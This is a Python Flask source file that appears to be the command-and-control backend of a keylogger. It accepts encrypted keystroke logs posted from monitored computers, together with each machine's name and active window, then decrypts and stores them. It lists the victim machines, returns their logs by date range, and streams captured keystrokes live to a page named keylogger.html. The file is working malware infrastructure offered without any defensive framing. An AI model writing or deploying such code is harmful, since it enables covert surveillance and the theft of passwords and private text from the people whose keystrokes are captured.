from flask import Flask, jsonify, request, redirect, Response
from flask_cors import CORS
from analyze_files import save_data_with_time, read_text, get_machines
from Encryption import encryption 
from Encryption import decryption ,decrypt_multiple

from datetime import datetime
import os
import queue

app = Flask(__name__)
CORS(app)
DATE_FORMAT = "%Y-%m-%d"
DATETIME_FORMAT = "%Y-%m-%d %H:%M:%S"

queues = {}

def get_queue(machine_id):
    if machine_id not in queues:
        queues[machine_id] = queue.Queue()
    return queues[machine_id]

@app.route('/')
def index():
    return redirect('/static/Frontend/keylogger.html')


@app.route('/api/computers', methods=['GET'])
def get_computers():
    return jsonify(get_machines())

@app.route('/api/data', methods=['POST'])
def write_data():
    new_data = request.json
    print(new_data)
    dt = datetime.strptime(new_data["timestamp"],"%Y-%m-%d %H:%M:%S")
    date_only = dt.date()
    data = (decrypt_multiple(new_data["log"]))
    print(new_data["log"])
    print(data)
    save_data_with_time(new_data["computer_name"],dt,new_data["active_window"],date_only,data)
    q = get_queue(new_data["computer_name"])
    q.put(str(data))
    return jsonify({
        "message": "Data saved successfully",
        "file": new_data
    }), 201


@app.route('/api/computers/<machine>', methods=['GET'])
def get_data(machine):
    global DATE_FORMAT
    p = request.args
    f_date = p["f_date"]
    t_date = p["t_date"]
    f_date = datetime.strptime(f_date,DATE_FORMAT)
    t_date = datetime.strptime(t_date,DATE_FORMAT)
    new_text = read_text(machine,f_date,t_date,DATE_FORMAT)
    return jsonify(new_text)

@app.route('/live/<machine_id>')
def live_stream(machine_id):
    q = get_queue(machine_id)
    def event_stream():
        while True:
            msg = q.get() 
            yield f"data: {msg}\n\n"
    return Response(event_stream(), mimetype="text/event-stream")

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")